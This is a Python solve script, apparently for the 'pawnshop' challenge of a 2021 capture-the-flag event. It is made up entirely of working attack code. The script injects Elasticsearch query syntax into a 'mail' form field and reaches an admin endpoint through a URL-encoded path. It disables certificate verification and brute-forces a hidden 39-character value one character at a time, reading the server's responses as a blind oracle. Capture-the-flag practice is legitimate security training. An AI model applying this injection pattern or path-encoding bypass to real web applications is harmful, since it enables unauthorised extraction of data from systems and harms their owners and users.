import requests
import string

s = requests.session()
# The number of characters can be determined by increasing the number of wildcard characters until the server responds with a found message
flag = "?" * 39

requests.packages.urllib3.disable_warnings()
charset = string.printable
charset = charset.replace("!",'').replace("\"",'').replace(")","").replace("(","").replace("*","").replace("?","").replace("/","").replace("\\","")
for i in range(39):
    for j in charset:
        flag = flag[:i] + j + flag[i + 1:]
        # Blind Elastic search injection
        d = {"action":"lookup","mail":'" AND (value:'+ flag + ' AND id:5) OR seller:"jmffc@pawnshop.2021.3k.ctf.to'}
        print(d["mail"])
        r = s.post("https://pawnshop.2021.3k.ctf.to:4443/backend/%25%36%31dmin.py",data=d,verify=False)
        try:
            j = r.json()
        except:
            continue
        # When the server responds with a found message
        if j['msg'] != "not found" : 
            print(j,i)
            break

